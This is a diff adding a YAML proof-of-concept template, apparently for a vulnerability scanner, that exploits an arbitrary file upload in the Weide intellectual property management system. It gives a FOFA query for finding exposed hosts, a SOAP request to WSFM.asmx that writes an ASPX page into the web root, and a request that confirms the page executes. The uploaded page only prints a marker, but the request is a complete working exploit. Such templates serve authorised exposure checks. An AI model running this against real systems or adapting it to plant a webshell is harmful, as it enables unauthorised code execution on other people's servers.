@@ -1,0 +1,31 @@
+id: poc-yaml-wadeinfo-wsfm-uploadfilewordtemplate-upload
+info:
+  name: 唯徳知识产权管理系统 UploadFileWordTemplate 任意文件上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 唯徳知识产权管理系统
+  fofa: body="JSCOMM/language.js"
+variables:
+  t1: random_int(111000,999000)
+  data: 'base64(`<%@ Page Language="C#"%><% Response.Write("vulnerability`+ str(t1)
+    +`");%>`)
+
+    '
+requests:
+- method: POST
+  path: /AutoUpdate/WSFM.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/UploadFileWordTemplate"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <UploadFileWordTemplate xmlns=\"http://tempuri.org/\">\n\
+    \      <fileByteArray>{{.data}}</fileByteArray>\n      <remotePath>/TemplateFiles/test.aspx</remotePath>\n\
+    \    </UploadFileWordTemplate>\n  </soap:Body>\n</soap:Envelope>"
+  expression: "status_code == 200 && \ncontains(body,\"</soap:Body>\") &&\ncontains(body,\"\
+    </UploadFileWordTemplateResult>\") &&\ncontains(body,\"true\")\n"
+- method: GET
+  path: /TemplateFiles/test.aspx
+  expression: "status_code == 200 && \nbody == \"vulnerability\" + t1\n"
+transport: http
